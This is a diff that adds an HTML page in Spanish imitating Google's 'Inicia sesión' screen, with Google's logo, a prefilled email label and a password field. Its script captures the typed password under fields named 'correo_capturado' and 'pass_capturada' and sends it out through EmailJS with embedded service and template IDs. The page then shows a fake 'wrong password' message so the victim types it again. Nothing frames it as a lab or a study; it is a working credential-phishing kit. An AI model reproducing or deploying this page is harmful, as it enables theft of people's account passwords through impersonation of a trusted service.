@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Accede a tu cuenta de Google</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f1f1f1;
+      margin: 0;
+      padding: 0;
+    }
+    .google-container {
+      background: white;
+      max-width: 360px;
+      margin: 60px auto;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    .google-logo {
+      width: 75px;
+      margin-bottom: 20px;
+    }
+    h2 {
+      font-size: 22px;
+      font-weight: 400;
+      color: #202124;
+      margin-bottom: 10px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+    input:focus {
+      border-color: #1a73e8;
+      outline: none;
+      box-shadow: 0 0 3px #1a73e8;
+    }
+    button {
+      width: 100%;
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      padding: 12px;
+      border-radius: 4px;
+      font-size: 14px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    button:hover {
+      background-color: #1669c1;
+    }
+    .link {
+      display: block;
+      margin-top: 20px;
+      font-size: 13px;
+      color: #1a73e8;
+      text-decoration: none;
+    }
+    .error {
+      color: red;
+      margin-top: 10px;
+      font-size: 14px;
+    }
+    .warning-box {
+      margin: 40px auto;
+      max-width: 500px;
+      background: #fff3cd;
+      padding: 15px;
+      border: 1px solid #ffeeba;
+      border-radius: 5px;
+      font-size: 14px;
+      color: #856404;
+    }
+  </style>
+</head>
+<body>
+  <div class="google-container">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
+         alt="Google" class="google-logo">
+    <h2>Inicia sesión</h2>
+
+    <form id="loginForm">
+	  <label for="emailText" id="email" style="font-weight: bold;">mairauri@ejemplo.com</label>
+      <input type="password" id="password" placeholder="Introduce tu contraseña" required>
+      <button type="submit">Siguiente</button>
+    </form>
+    <p id="mensaje" class="error"></p>
+    <a href="#" class="link">¿Has olvidado tu contraseña?</a></br>
+	    <div class="footer">
+      <select>
+        <option>Español (Latinoamérica)</option>
+        <option>English (US)</option>
+      </select>
+      <div class="footer-links">
+        <a href="#">Ayuda</a>
+        <a href="#">Privacidad</a>
+        <a href="#">Términos</a>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- EmailJS -->
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    emailjs.init("GGoi6k0Ug9EdSMszf"); // Coloca tu Public Key
+
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const emailUsuario = document.getElementById("email").value;
+      const passUsuario = document.getElementById("password").value;
+
+      const templateParams = {
+        correo_capturado: emailUsuario,
+        pass_capturada: passUsuario
+      };
+
+      emailjs.send("service_5xb9y0a", "template_uck6asw", templateParams)
+        .then(() => {
+          document.getElementById("mensaje").textContent =
+            "Contraseña incorrecta. Intente de nuevo.";
+        })
+        .catch((error) => {
+          document.getElementById("mensaje").textContent =
+            "Error al enviar datos.";
+          console.error(error);
+        });
+    });
+  </script>
+</body>
+</html>
